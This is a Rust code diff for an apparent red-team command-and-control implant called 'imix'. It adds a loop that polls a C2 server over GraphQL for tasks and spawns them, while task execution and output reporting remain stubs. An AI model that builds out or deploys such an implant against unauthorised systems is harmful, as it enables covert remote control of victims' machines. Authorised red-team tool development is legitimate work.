@@ -3,43 +3,24 @@ extern crate eldritch;
 
 use clap::{Command, arg};
 pub use imix::graphql;
+use imix::graphql::GraphQLTask;
+use std::borrow::BorrowMut;
+use std::collections::HashMap;
 use std::fs::File;
 use std::path::Path;
-use std::{time, thread};
 
 use anyhow::Error;
 use tokio::task::JoinHandle;
 
 enum TaskStatus {
-    Waiting,
     Running,
     Finished,
 }
 
-struct TaskData {
-    tome: String,
-}
-
-struct Task {
-    task_id: String, // Task ID from tavern
-    start_time: String, // When the task was started
+struct Task{
     status: TaskStatus, // Wating, Running, Finished
-    future_handle: JoinHandle<Result<String, Error>>, // Handle to the task
-    data: TaskData, //Not sure
-}
-
-async fn execute_tome(tome_path: String) -> String {
-    let ten_millis = time::Duration::from_secs(10);
-    thread::sleep(ten_millis);
-    return "A String".to_string()
-}
-
-async fn main_loop() {
-    let res = graphql::gql_claim_tasks("http://127.0.0.1:80/graphql".to_string()).await;
-    for task in res.unwrap() {
-        println!("{}", task.id);
-    }
-    unimplemented!("Nothing here yet. ")
+    graphql_task: GraphQLTask,
+    future_handle: JoinHandle<Result<(String,String), Error>>, // Handle to the task
 }
 
 async fn install(config_path: String) -> Result<(), imix::Error> {
@@ -57,6 +38,55 @@ async fn install(config_path: String) -> Result<(), imix::Error> {
 	unimplemented!("The current OS/Service Manager is not supported")
 }
 
+async fn execute_task(Task: GraphQLTask) -> Result<(String, String), Error> {
+    Ok(("root".to_string(), "".to_string()))
+}
+
+fn queue_task(input_task: GraphQLTask) -> Task {
+    let task_execute_future = execute_task(input_task.clone());
+    let res = Task{
+        status: TaskStatus::Running,
+        graphql_task: input_task,
+        future_handle: tokio::task::spawn(task_execute_future),
+    };
+    res
+}
+
+async fn main_loop(imix_config: imix::Config) {
+    let debug = true;
+    let mut active_tasks: HashMap<String,Task> = HashMap::new();
+    loop {
+        // 1. Pull down new tasks
+        let new_tasks = match graphql::gql_claim_tasks(imix_config.callback_config.c2_configs[0].uri.clone()).await {
+            Ok(tasks) => tasks,
+            Err(error) => {
+                if debug {
+                    println!("main_loop: error claiming task\n{:?}", error)
+                }
+                continue;
+            },
+        };
+
+        // 2. Start new tasks
+        for task in new_tasks {
+            match active_tasks.insert(task.id.clone(), queue_task(task)) {
+                Some(old_task) => {
+                    if debug {
+                        println!("main_loop: error adding new task. Non-unique taskID\n{}", old_task.graphql_task.id)
+                    }
+                },
+                None => {},
+            }
+        }    
+        // 3. Send task output
+        for task in &active_tasks {
+            
+        }
+
+    }
+    unimplemented!("Nothing here yet. ")
+}
+
 async fn run(config_path: String) -> Result<(), imix::Error> {
     let config_file = File::open(config_path)?;
     let config: imix::Config = serde_json::from_reader(config_file)?;
@@ -64,7 +94,7 @@ async fn run(config_path: String) -> Result<(), imix::Error> {
     #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
     unimplemented!("The current OS/Manager is not supported");
 
-    Ok(main_loop().await)
+    Ok(main_loop(config).await)
 
 }
 
@@ -101,3 +131,5 @@ async fn main() -> Result<(), imix::Error> {
         _ => Ok(())
     }
 }
+
+
